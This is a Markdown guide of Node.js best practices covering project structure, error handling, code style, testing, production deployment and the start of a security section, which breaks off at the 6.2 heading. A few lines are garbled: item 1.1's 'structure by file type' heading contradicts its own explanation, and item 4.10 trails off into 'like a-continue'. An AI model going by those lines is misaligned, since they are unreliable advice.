# Node.js Best Practices

## Table of Contents

1.  [Project Structure Practices (5)](#1-project-structure-practices)
2.  [Error Handling Practices (11) ](#2-error-handling-practices)
3.  [Code Style Practices (12) ](#3-code-style-practices)
4.  [Testing And Overall Quality Practices (12) ](#4-testing-and-overall-quality-practices)
5.  [Going To Production Practices (18) ](#5-going-to-production-practices)
6.  [Security Practices (25)](#6-security-best-practices)
7.  [Performance Practices (1)](#7-performance-best-practices)

<br/><br/>

# `1. Project Structure Practices`

## 1.1 Structure your solution by file type

**TL;DR:** Fractal pattern convey that similar patterns recur progressively and the same thought process is applied to the structuring of codebase i.e All units repeat themselves.

🔗 [**Read More: project file structure**](#project-file-structure)

<br/><br/>

## 1.2 Layer your components, keep Express within its boundaries

**TL;DR:** Each component should contain 'layers' - a dedicated object for the web, logic, and data access code. This not only draws a clean separation of concerns but also significantly eases mocking and testing the system. Though this is a very common pattern, API developers tend to mix layers by passing the web layer objects (Express req, res) to business logic and data layers - this makes your application dependent on and accessible by Express only

**Otherwise:** App that mixes web objects with other layers cannot be accessed by testing code, CRON jobs, and other non-Express callers

<br/><br/>

## 1.3 Wrap common utilities as npm packages

**TL;DR:** In a large app that constitutes a large code base, cross-cutting-concern utilities like logger, encryption and alike, should be wrapped by your own code and exposed as private npm packages. This allows sharing them among multiple code bases and projects

**Otherwise:** You'll have to invent your own deployment and dependency wheel

🔗 [**Read More: Structure by feature**](#wrap-common-utilities-as-npm-packages)

<br/><br/>

## 1.4 Separate Express 'app' and 'server'

**TL;DR:** Avoid the nasty habit of defining the entire [Express](https://expressjs.com/) app in a single huge file - separate your 'Express' definition to at least two files: the API declaration (app.js) and the networking concerns (WWW). For even better structure, locate your API declaration within components

**Otherwise:** Your API will be accessible for testing via HTTP calls only (slower and much harder to generate coverage reports). It probably won't be a big pleasure to maintain hundreds of lines of code in a single file

🔗 [**Read More: separate Express 'app' and 'server'**](#separate-express-app-and-server)

<br/><br/>

## 1.5 Use environment aware, secure and hierarchical config

**TL;DR:** A perfect and flawless configuration setup should ensure (a) keys can be read from file AND from environment variable (b) secrets are kept outside committed code (c) config is hierarchical for easier findability. There are a few packages that can help tick most of those boxes like [rc](https://www.npmjs.com/package/rc), [nconf](https://www.npmjs.com/package/nconf) and [config](https://www.npmjs.com/package/config)

**Otherwise:** Failing to satisfy any of the config requirements will simply bog down the development or devops team. Probably both

🔗 [**Read More: configuration best practices**](#use-environment-aware-secure-and-hierarchical-config)

<br/><br/><br/>

<p align="right"><a href="#table-of-contents">⬆ Return to top</a></p>

# `2. Error Handling Practices`

## 2.1 Use Async-Await or promises for async error handling

**TL;DR:** Handling async errors in callback style is probably the fastest way to hell (a.k.a the pyramid of doom). The best gift you can give to your code is using a reputable promise library or async-await instead which enables a much more compact and familiar code syntax like try-catch

**Otherwise:** Node.js callback style, function(err, response), is a promising way to un-maintainable code due to the mix of error handling with casual code, excessive nesting, and awkward coding patterns

🔗 [**Read More: avoiding callbacks**](#use-async-await-or-promises-for-async-error-handling)

<br/><br/>

## 2.2 Use only the built-in Error object

**TL;DR:** Many throw errors as a string or as some custom type – this complicates the error handling logic and the interoperability between modules. Whether you reject a promise, throw an exception or emit an error – using only the built-in Error object will increase uniformity and prevent loss of information

**Otherwise:** When invoking some component, being uncertain which type of errors come in return – it makes proper error handling much harder. Even worse, using custom types to describe errors might lead to loss of critical error information like the stack trace!

🔗 [**Read More: using the built-in error object**](#use-only-the-built-in-error-object)

<br/><br/>

## 2.3 Distinguish operational vs programmer errors

**TL;DR:** Operational errors (e.g. API received an invalid input) refer to known cases where the error impact is fully understood and can be handled thoughtfully. On the other hand, programmer error (e.g. trying to read undefined variable) refers to unknown code failures that dictate to gracefully restart the application

**Otherwise:** You may always restart the application when an error appears, but why let ~5000 online users down because of a minor, predicted, operational error? the opposite is also not ideal – keeping the application up when an unknown issue (programmer error) occurred might lead to an unpredicted behavior. Differentiating the two allows acting tactfully and applying a balanced approach based on the given context

🔗 [**Read More: operational vs programmer error**](#distinguish-operational-vs-programmer-errors)

<br/><br/>

## 2.4 Handle errors centrally, not within an Express middleware

**TL;DR:** Error handling logic such as mail to admin and logging should be encapsulated in a dedicated and centralized object that all endpoints (e.g. Express middleware, cron jobs, unit-testing) call when an error comes in

**Otherwise:** Not handling errors within a single place will lead to code duplication and probably to improperly handled errors

🔗 [**Read More: handling errors in a centralized place**](#handle-errors-centrally-not-within-middlewares)

<br/><br/>

## 2.5 Document API errors using Swagger or GraphQL

**TL;DR:** Let your API callers know which errors might come in return so they can handle these thoughtfully without crashing. For RESTful APIs, this is usually done with documentation frameworks like Swagger. If you're using GraphQL, you can utilize your schema and comments as well.

**Otherwise:** An API client might decide to crash and restart only because it received back an error it couldn’t understand. Note: the caller of your API might be you (very typical in a microservice environment)

🔗 [**Read More: documenting API errors in Swagger or GraphQL**](#document-api-errors-using-swagger-or-graphql)

<br/><br/>

## 2.6 Exit the process gracefully when a stranger comes to town

**TL;DR:** When an unknown error occurs (a developer error, see best practice 2.3) - there is uncertainty about the application healthiness. A common practice suggests restarting the process carefully using a process management tool like [Forever](https://www.npmjs.com/package/forever) or [PM2](http://pm2.keymetrics.io/)

**Otherwise:** When an unfamiliar exception occurs, some object might be in a faulty state (e.g. an event emitter which is used globally and not firing events anymore due to some internal failure) and all future requests might fail or behave crazily

🔗 [**Read More: shutting the process**](#exit-the-process-gracefully-when-a-stranger-comes-to-town)

<br/><br/>

## 2.7 Use a mature logger to increase error visibility

**TL;DR:** A set of mature logging tools like [Winston](https://www.npmjs.com/package/winston), [Pino](http://getpino.io/#/), will speed-up error discovery and understanding. So forget about console.log

**Otherwise:** Skimming through console.logs or manually through messy text file without querying tools or a decent log viewer might keep you busy at work until late

🔗 [**Read More: using a mature logger**](#use-a-mature-logger-to-increase-errors-visibility)

<br/><br/>

## 2.8 Test error flows using your favorite test framework

**TL;DR:** Whether professional automated QA or plain manual developer testing – Ensure that your code not only satisfies positive scenarios but also handles and returns the right errors. Testing frameworks like Mocha & Chai can handle this easily (see code examples within the "Gist popup")

**Otherwise:** Without testing, whether automatically or manually, you can’t rely on your code to return the right errors. Without meaningful errors – there’s no error handling

🔗 [**Read More: testing error flows**](#test-error-flows-using-your-favorite-test-framework)

<br/><br/>

## 2.9 Discover errors and downtime using APM products

**TL;DR:** Monitoring and performance products (a.k.a APM) proactively gauge your codebase or API so they can automagically highlight errors, crashes and slow parts that you were missing

**Otherwise:** You might spend great effort on measuring API performance and downtimes, probably you’ll never be aware which are your slowest code parts under real-world scenario and how these affect the UX

🔗 [**Read More: using APM products**](#discover-errors-and-downtime-using-apm-products)

<br/><br/>

## 2.10 Catch unhandled promise rejections

**TL;DR:** Any exception thrown within a promise will get swallowed and discarded unless a developer didn’t forget to explicitly handle. Even if your code is subscribed to `process.uncaughtException`! Overcome this by registering to the event `process.unhandledRejection`

**Otherwise:** Your errors will get swallowed and leave no trace. Nothing to worry about

🔗 [**Read More: catching unhandled promise rejection**](#catch-unhandled-promise-rejections)

<br/><br/>

## 2.11 Fail fast, validate arguments using a dedicated library

**TL;DR:** This should be part of your Express best practices – Assert API input to avoid nasty bugs that are much harder to track later. The validation code is usually tedious unless you are using a very cool helper library like Joi

**Otherwise:** Consider this – your function expects a numeric argument “Discount” which the caller forgets to pass, later on, your code checks if Discount!=0 (amount of allowed discount is greater than zero), then it will allow the user to enjoy a discount. OMG, what a nasty bug. Can you see it?

🔗 [**Read More: failing fast**](#fail-fast-validate-arguments-using-a-dedicated-library)

<br/><br/><br/>

<p align="right"><a href="#table-of-contents">⬆ Return to top</a></p>

# `3. Code Style Practices`

## 3.1 Use ESLint

**TL;DR:** [ESLint](https://eslint.org) is the de-facto standard for checking possible code errors and fixing code style, not only to identify nitty-gritty spacing issues but also to detect serious code anti-patterns like developers throwing errors without classification. Though ESLint can automatically fix code styles, other tools like [prettier](https://www.npmjs.com/package/prettier) and [beautify](https://www.npmjs.com/package/js-beautify) are more powerful in formatting the fix and work in conjunction with ESLint

**Otherwise:** Developers will focus on tedious spacing and line-width concerns and time might be wasted overthinking the project's code style

🔗 [**Read More: Using ESLint and Prettier**](#using-eslint-and-prettier)

<br/><br/>

## 3.2 Node.js specific plugins

**TL;DR:** On top of ESLint standard rules that cover vanilla JavaScript, add Node.js specific plugins like [eslint-plugin-node](https://www.npmjs.com/package/eslint-plugin-node), [eslint-plugin-mocha](https://www.npmjs.com/package/eslint-plugin-mocha) and [eslint-plugin-node-security](https://www.npmjs.com/package/eslint-plugin-security)

**Otherwise:** Many faulty Node.js code patterns might escape under the radar. For example, developers might require(variableAsPath) files with a variable given as path which allows attackers to execute any JS script. Node.js linters can detect such patterns and complain early

<br/><br/>

## 3.3 Start a Codeblock's Curly Braces on the Same Line

**TL;DR:** The opening curly braces of a code block should be on the same line as the opening statement

### Code Example

```javascript
// Do
function someFunction() {
  // code block
}

// Avoid
function someFunction()
{
  // code block
}
```

**Otherwise:** Deferring from this best practice might lead to unexpected results, as seen in the StackOverflow thread below:

🔗 [**Read more:** "Why do results vary based on curly brace placement?" (StackOverflow)](https://stackoverflow.com/questions/3641519/why-does-a-results-vary-based-on-curly-brace-placement)

<br/><br/>

## 3.4 Separate your statements properly

No matter if you use semicolons or not to separate your statements, knowing the common pitfalls of improper linebreaks or automatic semicolon insertion, will help you to eliminate regular syntax errors.

**TL;DR:** Use ESLint to gain awareness about separation concerns. [Prettier](https://prettier.io/) or [Standardjs](https://standardjs.com/) can automatically resolve these issues.

**Otherwise:** As seen in the previous section, JavaScript's interpreter automatically adds a semicolon at the end of a statement if there isn't one, or considers a statement as not ended where it should, which might lead to some undesired results. You can use assignments and avoid using immediate invoked function expressions to prevent most of unexpected errors.

### Code example

```javascript
// Do
function doThing() {
    // ...
}

doThing()

// Do

const items = [1, 2, 3]
items.forEach(console.log)

// Avoid — throws exception
const m = new Map()
const a = [1,2,3]
[...m.values()].forEach(console.log)
> [...m.values()].forEach(console.log)
>  ^^^
> SyntaxError: Unexpected token ...

// Avoid — throws exception
const count = 2 // it tries to run 2(), but 2 is not a function
(function doSomething() {
  // do something amazing
}())
// put a semicolon before the immediate invoked function, after the const definition, save the return value of the anonymous function to a variable or avoid IIFEs alltogether
```

🔗 [**Read more:** "Semi ESLint rule"](https://eslint.org/docs/rules/semi)
🔗 [**Read more:** "No unexpected multiline ESLint rule"](https://eslint.org/docs/rules/no-unexpected-multiline)

<br/><br/>

## 3.5 Name your functions

**TL;DR:** Name all functions, including closures and callbacks. Avoid anonymous functions. This is especially useful when profiling a node app. Naming all functions will allow you to easily understand what you're looking at when checking a memory snapshot

**Otherwise:** Debugging production issues using a core dump (memory snapshot) might become challenging as you notice significant memory consumption from anonymous functions

<br/><br/>

## 3.6 Use naming conventions for variables, constants, functions and classes

**TL;DR:** Use **_lowerCamelCase_** when naming constants, variables and functions and **_UpperCamelCase_** (capital first letter as well) when naming classes. This will help you to easily distinguish between plain variables/functions, and classes that require instantiation. Use descriptive names, but try to keep them short

**Otherwise:** Javascript is the only language in the world which allows invoking a constructor ("Class") directly without instantiating it first. Consequently, Classes and function-constructors are differentiated by starting with UpperCamelCase

### Code Example

```javascript
// for class name we use UpperCamelCase
class SomeClassExample {}

// for const names we use the const keyword and lowerCamelCase
const config = {
  key: 'value'
};

// for variables and functions names we use lowerCamelCase
let someVariableExample = 'value';
function doSomething() {}
```

<br/><br/>

## 3.7 Prefer const over let. Ditch the var

**TL;DR:** Using `const` means that once a variable is assigned, it cannot be reassigned. Preferring `const` will help you to not be tempted to use the same variable for different uses, and make your code clearer. If a variable needs to be reassigned, in a for loop, for example, use `let` to declare it. Another important aspect of `let` is that a variable declared using it is only available in the block scope in which it was defined. `var` is function scoped, not block scoped, and [shouldn't be used in ES6](https://hackernoon.com/why-you-shouldnt-use-var-anymore-f109a58b9b70) now that you have `const` and `let` at your disposal

**Otherwise:** Debugging becomes way more cumbersome when following a variable that frequently changes

🔗 [**Read more: JavaScript ES6+: var, let, or const?** ](https://medium.com/javascript-scene/javascript-es6-var-let-or-const-ba58b8dcde75)

<br/><br/>

## 3.8 Require modules first, not inside functions

**TL;DR:** Require modules at the beginning of each file, before and outside of any functions. This simple best practice will not only help you easily and quickly tell the dependencies of a file right at the top but also avoids a couple of potential problems

**Otherwise:** Requires are run synchronously by Node.js. If they are called from within a function, it may block other requests from being handled at a more critical time. Also, if a required module or any of its own dependencies throw an error and crash the server, it is best to find out about it as soon as possible, which might not be the case if that module is required from within a function

<br/><br/>

## 3.9 Require modules by folders, opposed to the files directly

**TL;DR:** When developing a module/library in a folder, place an index.js file that exposes the module's internals so every consumer will pass through it. This serves as an 'interface' to your module and eases future changes without breaking the contract

**Otherwise:** Changing the internal structure of files or the signature may break the interface with clients

### Code example

```javascript
// Do
module.exports.SMSProvider = require('./SMSProvider');
module.exports.SMSNumberResolver = require('./SMSNumberResolver');

// Avoid
module.exports.SMSProvider = require('./SMSProvider/SMSProvider.js');
module.exports.SMSNumberResolver = require('./SMSNumberResolver/SMSNumberResolver.js');
```

<br/><br/>

## 3.10 Use the `===` operator

**TL;DR:** Prefer the strict equality operator `===` over the weaker abstract equality operator `==`. `==` will compare two variables after converting them to a common type. There is no type conversion in `===`, and both variables must be of the same type to be equal

**Otherwise:** Unequal variables might return true when compared with the `==` operator

### Code example

```javascript
'' == '0'           // false
0 == ''             // true
0 == '0'            // true

false == 'false'    // false
false == '0'        // true

false == undefined  // false
false == null       // false
null == undefined   // true

' \t\r\n ' == 0     // true
```

All statements above will return false if used with `===`

<br/><br/>

## 3.11 Use Async Await, avoid callbacks

**TL;DR:** Node 8 LTS now has full support for Async-await. This is a new way of dealing with asynchronous code which supersedes callbacks and promises. Async-await is non-blocking, and it makes asynchronous code look synchronous. The best gift you can give to your code is using async-await which provides a much more compact and familiar code syntax like try-catch

**Otherwise:** Handling async errors in callback style is probably the fastest way to hell - this style forces to check errors all over, deal with awkward code nesting and makes it difficult to reason about the code flow

🔗[**Read more:** Guide to async await 1.0](https://github.com/yortus/asyncawait)

<br/><br/>

## 3.12 Use arrow function expressions (=>)

**TL;DR:** Though it's recommended to use async-await and avoid function parameters when dealing with older APIs that accept promises or callbacks - arrow functions make the code structure more compact and keep the lexical context of the root function (i.e. `this`)

**Otherwise:** Longer code (in ES5 functions) is more prone to bugs and cumbersome to read

🔗 [**Read more: It’s Time to Embrace Arrow Functions**](https://medium.com/javascript-scene/familiarity-bias-is-holding-you-back-its-time-to-embrace-arrow-functions-3d37e1a9bb75)

<br/><br/><br/>

<p align="right"><a href="#table-of-contents">⬆ Return to top</a></p>

# `4. Testing And Overall Quality Practices`

## 4.1 At the very least, write API (component) testing

**TL;DR:** Most projects just don't have any automated testing due to short timetables or often the 'testing project' ran out of control and was abandoned. For that reason, prioritize and start with API testing which is the easiest way to write and provides more coverage than unit testing (you may even craft API tests without code using tools like [Postman](https://www.getpostman.com/). Afterward, should you have more resources and time, continue with advanced test types like unit testing, DB testing, performance testing, etc

**Otherwise:** You may spend long days on writing unit tests to find out that you got only 20% system coverage

<br/><br/>

## 4.2 Include 3 parts in each test name

**TL;DR:** Make the test speak at the requirements level so it's self explanatory also to QA engineers and developers who are not familiar with the code internals. State in the test name what is being tested (unit under test), under what circumstances and what is the expected result

**Otherwise:** A deployment just failed, a test named “Add product” failed. Does this tell you what exactly is malfunctioning?

🔗 [**Read More: Include 3 parts in each test name**](#include-3-parts-in-each-test-name)

<br/><br/>

## 4.3 Structure tests by the AAA pattern

**TL;DR:** Structure your tests with 3 well-separated sections: Arrange, Act & Assert (AAA). The first part includes the test setup, then the execution of the unit under test and finally the assertion phase. Following this structure guarantees that the reader spends no brain CPU on understanding the test plan

**Otherwise:** Not only you spend long daily hours on understanding the main code, now also what should have been the simple part of the day (testing) stretches your brain

🔗 [**Read More: Structure tests by the AAA pattern**](#structure-tests-by-the-aaa-pattern)

<br/><br/>

## 4.4 Detect code issues with a linter

**TL;DR:** Use a code linter to check basic quality and detect anti-patterns early. Run it before any test and add it as a pre-commit git-hook to minimize the time needed to review and correct any issue. Also check [Section 3](https://github.com/i0natan/nodebestpractices#3-code-style-practices) on Code Style Practices

**Otherwise:** You may let pass some anti-pattern and possible vulnerable code to your production environment.

<br/><br/>

## 4.5 Avoid global test fixtures and seeds, add data per-test

**TL;DR:** To prevent tests coupling and easily reason about the test flow, each test should add and act on its own set of DB rows. Whenever a test needs to pull or assume the existence of some DB data - it must explicitly add that data and avoid mutating any other records

**Otherwise:** Consider a scenario where deployment is aborted due to failing tests, team is now going to spend precious investigation time that ends in a sad conclusion: the system works well, the tests however interfere with each other and break the build

🔗 [**Read More: Avoid global test fixtures**](#avoid-global-test-fixtures-and-seeds-add-data-per-test)

<br/><br/>

## 4.6 Constantly inspect for vulnerable dependencies

**TL;DR:** Even the most reputable dependencies such as Express have known vulnerabilities. This can get easily tamed using community and commercial tools such as 🔗 [npm audit](https://docs.npmjs.com/cli/audit) and 🔗 [snyk.io](https://snyk.io) that can be invoked from your CI on every build

**Otherwise:** Keeping your code clean from vulnerabilities without dedicated tools will require to constantly follow online publications about new threats. Quite tedious

<br/><br/>

## 4.7 Tag your tests

**TL;DR:** Different tests must run on different scenarios: quick smoke, IO-less, tests should run when a developer saves or commits a file, full end-to-end tests usually run when a new pull request is submitted, etc. This can be achieved by tagging tests with keywords like #cold #api #sanity so you can grep with your testing harness and invoke the desired subset. For example, this is how you would invoke only the sanity test group with [Mocha](https://mochajs.org/): mocha --grep 'sanity'

**Otherwise:** Running all the tests, including tests that perform dozens of DB queries, any time a developer makes a small change can be extremely slow and keeps developers away from running tests

<br/><br/>

## 4.8 Check your test coverage, it helps to identify wrong test patterns

**TL;DR:** Code coverage tools like [Istanbul/NYC ](https://github.com/gotwarlost/istanbul)are great for 3 reasons: it comes for free (no effort is required to benefit this reports), it helps to identify a decrease in testing coverage, and last but not least it highlights testing mismatches: by looking at colored code coverage reports you may notice, for example, code areas that are never tested like catch clauses (meaning that tests only invoke the happy paths and not how the app behaves on errors). Set it to fail builds if the coverage falls under a certain threshold

**Otherwise:** There won't be any automated metric telling you when a large portion of your code is not covered by testing

<br/><br/>

## 4.9 Inspect for outdated packages

**TL;DR:** Use your preferred tool (e.g. 'npm outdated' or [npm-check-updates](https://www.npmjs.com/package/npm-check-updates) to detect installed packages which are outdated, inject this check into your CI pipeline and even make a build fail in a severe scenario. For example, a severe scenario might be when an installed package is 5 patch commits behind (e.g. local version is 1.3.1 and repository version is 1.3.8) or it is tagged as deprecated by its author - kill the build and prevent deploying this version

**Otherwise:** Your production will run packages that have been explicitly tagged by their author as risky

<br/><br/>

## 4.10 Use production-like env for e2e testing

**TL;DR:** End to end (e2e) testing which includes live data used to be the weakest link of the CI process as it depends on multiple heavy services like DB. Use an environment which is as closed to your real production as possible like a-continue

**Otherwise:** Without docker-compose teams must maintain a testing DB for each testing environment including developers' machines, keep all those DBs in sync so test results won't vary across environments

<br/><br/>

## 4.11 Refactor regularly using static analysis tools

**TL;DR:** Using static analysis tools helps by giving objective ways to improve code quality and keeps your code maintainable. You can add static analysis tools to your CI build to fail when it finds code smells. Its main selling points over plain linting are the ability to inspect quality in the context of multiple files (e.g. detect duplications), perform advanced analysis (e.g. code complexity) and follow the history and progress of code issues. Two examples of tools you can use are [Sonarqube](https://www.sonarqube.org/) (2,600+ [stars](https://github.com/SonarSource/sonarqube)) and [Code Climate](https://codeclimate.com/) (1,500+ [stars](https://github.com/codeclimate/codeclimate)).

**Otherwise:** With poor code quality, bugs and performance will always be an issue that no shiny new library or state of the art features can fix

🔗 [**Read More: Refactoring!**](#refactoring)

<br/><br/>

## 4.12 Carefully choose your CI platform (Jenkins vs CircleCI vs Travis vs Rest of the world)

**TL;DR:** Your continuous integration platform (CICD) will host all the quality tools (e.g test, lint) so it should come with a vibrant ecosystem of plugins. [Jenkins](https://jenkins.io/) used to be the default for many projects as it has the biggest community along with a very powerful platform at the price of complex setup that demands a steep learning curve. Nowadays, it has become much easier to set up a CI solution using SaaS tools like [CircleCI](https://circleci.com) and others. These tools allow crafting a flexible CI pipeline without the burden of managing the whole infrastructure. Eventually, it's a trade-off between robustness and speed - choose your side carefully

**Otherwise:** Choosing some niche vendor might get you blocked once you need some advanced customization. On the other hand, going with Jenkins might burn precious time on infrastructure setup

🔗 [**Read More: Choosing CI platform**](#carefully-choose-your-ci-platform)

<br/><br/><br/>


<p align="right"><a href="#table-of-contents">⬆ Return to top</a></p>

# `5. Going To Production Practices`

## 5.1. Monitoring!

**TL;DR:** Monitoring is a game of finding out issues before customers do – obviously this should be assigned unprecedented importance. The market is overwhelmed with offers thus consider starting with defining the basic metrics you must follow (my suggestions inside), then go over additional fancy features and choose the solution that ticks all boxes. Click ‘The Gist’ below for an overview of the solutions

**Otherwise:** Failure === disappointed customers. Simple

🔗 [**Read More: Monitoring!**](#monitoring)

<br/><br/>

## 5.2. Increase transparency using smart logging

**TL;DR:** Logs can be a dumb warehouse of debug statements or the enabler of a beautiful dashboard that tells the story of your app. Plan your logging platform from day 1: how logs are collected, stored and analyzed to ensure that the desired information (e.g. error rate, following an entire transaction through services and servers, etc) can really be extracted

**Otherwise:** You end up with a black box that is hard to reason about, then you start re-writing all logging statements to add additional information

🔗 [**Read More: Increase transparency using smart logging**](#smart-logging)

<br/><br/>

## 5.3. Delegate anything possible (e.g. gzip, SSL) to a reverse proxy

**TL;DR:** Node is awfully bad at doing CPU intensive tasks like gzipping, SSL termination, etc. You should use ‘real’ middleware services like nginx, HAproxy or cloud vendor services instead

**Otherwise:** Your poor single thread will stay busy doing infrastructural tasks instead of dealing with your application core and performance will degrade accordingly

🔗 [**Read More: Delegate anything possible (e.g. gzip, SSL) to a reverse proxy**](#delegate-anything-possible-eg-static-content-gzip-to-a-reverse-proxy)

<br/><br/>

## 5.4. Lock dependencies

**TL;DR:** Your code must be identical across all environments, but amazingly npm lets dependencies drift across environments by default – when you install packages at various environments it tries to fetch packages’ latest patch version. Overcome this by using npm config files, .npmrc, that tell each environment to save the exact (not the latest) version of each package. Alternatively, for finer grained control use `npm shrinkwrap`. \*Update: as of NPM5, dependencies are locked by default. The new package manager in town, Yarn, also got us covered by default

**Otherwise:** QA will thoroughly test the code and approve a version that will behave differently in production. Even worse, different servers in the same production cluster might run different code

🔗 [**Read More: Lock dependencies**](#lock-dependencies)

<br/><br/>

## 5.5. Guard process uptime using the right tool

**TL;DR:** The process must go on and get restarted upon failures. For simple scenarios, process management tools like PM2 might be enough but in today's ‘dockerized’ world, cluster management tools should be considered as well

**Otherwise:** Running dozens of instances without a clear strategy and too many tools together (cluster management, docker, PM2) might lead to DevOps chaos

🔗 [**Read More: Guard process uptime using the right tool**](#guard-and-restart-your-process-upon-failure-using-the-right-tool)

<br/><br/>

## 5.6. Utilize all CPU cores

**TL;DR:** At its basic form, a Node app runs on a single CPU core while all others are left idling. It’s your duty to replicate the Node process and utilize all CPUs – For small-medium apps you may use Node Cluster or PM2. For a larger app consider replicating the process using some Docker cluster (e.g. K8S, ECS) or deployment scripts that are based on Linux init system (e.g. systemd)

**Otherwise:** Your app will likely utilize only 25% of its available resources(!) or even less. Note that a typical server has 4 CPU cores or more, naive deployment of Node.js utilizes only 1 (even using PaaS services like AWS beanstalk!)

🔗 [**Read More: Utilize all CPU cores**](#utilize-all-cpu-cores)

<br/><br/>

## 5.7. Create a ‘maintenance endpoint’

**TL;DR:** Expose a set of system-related information, like memory usage and REPL, etc in a secured API. Although it’s highly recommended to rely on standard and battle-tests tools, some valuable information and operations are easier done using code

**Otherwise:** You’ll find that you’re performing many “diagnostic deploys” – shipping code to production only to extract some information for diagnostic purposes

🔗 [**Read More: Create a ‘maintenance endpoint’**](#create-maintenance-endpoint)

<br/><br/>

## 5.8. Discover errors and downtime using APM products

**TL;DR:** Application monitoring and performance products (a.k.a APM) proactively gauge codebase and API so they can auto-magically go beyond traditional monitoring and measure the overall user-experience across services and tiers. For example, some APM products can highlight a transaction that loads too slow on the end-users side while suggesting the root cause

**Otherwise:** You might spend great effort on measuring API performance and downtimes, probably you’ll never be aware which is your slowest code parts under real-world scenario and how these affect the UX

🔗 [**Read More: Discover errors and downtime using APM products**](#sure-user-experience-with-apm-products)

<br/><br/>

## 5.9. Make your code production-ready

**TL;DR:** Code with the end in mind, plan for production from day 1. This sounds a bit vague so I’ve compiled a few development tips that are closely related to production maintenance (click Gist below)

**Otherwise:** A world champion IT/DevOps guy won’t save a system that is badly written

🔗 [**Read More: Make your code production-ready**](#make-your-code-production-ready)

<br/><br/>

## 5.10. Measure and guard the memory usage

**TL;DR:** Node.js has controversial relationships with memory: the v8 engine has soft limits on memory usage (1.4GB) and there are known paths to leak memory in Node’s code – thus watching Node’s process memory is a must. In small apps, you may gauge memory periodically using shell commands but in medium-large apps consider baking your memory watch into a robust monitoring system

**Otherwise:** Your process memory might leak a hundred megabytes a day like how it happened at [Walmart](https://www.joyent.com/blog/walmart-node-js-memory-leak)

🔗 [**Read More: Measure and guard the memory usage**](#measure-and-guard-the-memory-usage)

<br/><br/>

## 5.11. Get your frontend assets out of Node

**TL;DR:** Serve frontend content using dedicated middleware (nginx, S3, CDN) because Node performance really gets hurt when dealing with many static files due to its single-threaded model

**Otherwise:** Your single Node thread will be busy streaming hundreds of html/images/angular/react files instead of allocating all its resources for the task it was born for – serving dynamic content

🔗 [**Read More: Get your frontend assets out of Node**](#get-your-frontend-assets-out-of-node)

<br/><br/>

## 5.12. Be stateless, kill your servers almost every day

**TL;DR:** Store any type of data (e.g. user sessions, cache, uploaded files) within external data stores. Consider ‘killing’ your servers periodically or use ‘serverless’ platform (e.g. AWS Lambda) that explicitly enforces a stateless behavior

**Otherwise:** Failure at a given server will result in application downtime instead of just killing a faulty machine. Moreover, scaling-out elasticity will get more challenging due to the reliance on a specific server

🔗 [**Read More: Be stateless, kill your Servers almost every day**](#be-stateless-kill-your-servers-almost-every-day)

<br/><br/>

## 5.13. Use tools that automatically detect vulnerabilities

**TL;DR:** Even the most reputable dependencies such as Express have known vulnerabilities (from time to time) that can put a system at risk. This can be easily tamed using community and commercial tools that constantly check for vulnerabilities and warn (locally or at GitHub), some can even patch them immediately

**Otherwise:** Keeping your code clean from vulnerabilities without dedicated tools will require you to constantly follow online publications about new threats. Quite tedious

🔗 [**Read More: Use tools that automatically detect vulnerabilities**](#use-tools-that-automatically-detect-vulnerable-dependencies)

<br/><br/>

## 5.14. Assign a transaction id to each log statement

**TL;DR:** Assign the same identifier, transaction-id: {some value}, to each log entry within a single request. Then when inspecting errors in logs, easily conclude what happened before and after. Unfortunately, this is not easy to achieve in Node due to its async nature, see code examples inside

**Otherwise:** Looking at a production error log without the context – what happened before – makes it much harder and slower to reason about the issue

🔗 [**Read More: Assign ‘TransactionId’ to each log statement**](#assign-transactionid-to-each-log-statement)

<br/><br/>

## 5.15. Set NODE_ENV=production

**TL;DR:** Set the environment variable NODE_ENV to ‘production’ or ‘development’ to flag whether production optimizations should get activated – many npm packages determine the current environment and optimize their code for production

**Otherwise:** Omitting this simple property might greatly degrade performance. For example, when using Express for server-side rendering omitting `NODE_ENV` makes it slower by a factor of three!

🔗 [**Read More: Set NODE_ENV=production**](#set-node_env--production)

<br/><br/>

## 5.16. Design automated, atomic and zero-downtime deployments

**TL;DR:** Research shows that teams who perform many deployments lower the probability of severe production issues. Fast and automated deployments that don’t require risky manual steps and service downtime significantly improve the deployment process. You should probably achieve this using Docker combined with CI tools as they became the industry standard for streamlined deployment

**Otherwise:** Long deployments -> production downtime & human-related error -> team unconfident in making deployment -> fewer deployments and features

<br/><br/>

## 5.17. Use an LTS release of Node.js

**TL;DR:** Ensure you are using an LTS version of Node.js to receive critical bug fixes, security updates and performance improvements

**Otherwise:** Newly discovered bugs or vulnerabilities could be used to exploit an application running in production, and your application may become unsupported by various modules and harder to maintain

🔗 [**Read More: Use an LTS release of Node.js**](#use-an-lts-release-of-nodejs-in-production)

<br/><br/>

## 5.18. Don't route logs within the app

**TL;DR:** Log destinations should not be hard-coded by developers within the application code, but instead should be defined by the execution environment the application runs in. Developers should write logs to `stdout` using a logger utility and then let the execution environment (container, server, etc.) pipe the `stdout` stream to the appropriate destination (i.e. Splunk, Graylog, ElasticSearch, etc.).

**Otherwise:** Application handling log routing === hard to scale, loss of logs, poor separation of concerns

🔗 [**Read More: Log Routing**](#your-application-code-should-not-handle-log-routing)

<br/><br/><br/>

<p align="right"><a href="#table-of-contents">⬆ Return to top</a></p>

# `6. Security Best Practices`

<div align="center">
<img src="https://img.shields.io/badge/OWASP%20Threats-Top%2010-green.svg" alt="54 items"/>
</div>

## 6.1. Embrace linter security rules

<a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt=""/></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20XSS%20-green.svg" alt=""/></a>

**TL;DR:** Make use of security-related linter plugins such as [eslint-plugin-security](https://github.com/nodesecurity/eslint-plugin-security) to catch security vulnerabilities and issues as early as possible, preferably while they're being coded. This can help catching security weaknesses like using eval, invoking a child process or importing a module with a string literal (e.g. user input). Click 'Read more' below to see code examples that will get caught by a security linter

**Otherwise:** What could have been a straightforward security weakness during development becomes a major issue in production. Also, the project may not follow consistent code security practices, leading to vulnerabilities being introduced, or sensitive secrets committed into remote repositories

🔗 [**Read More: Lint rules**](#embrace-linter-security-rules)

<br/><br/>

## 6.2. Limit concurrent requests using a middleware

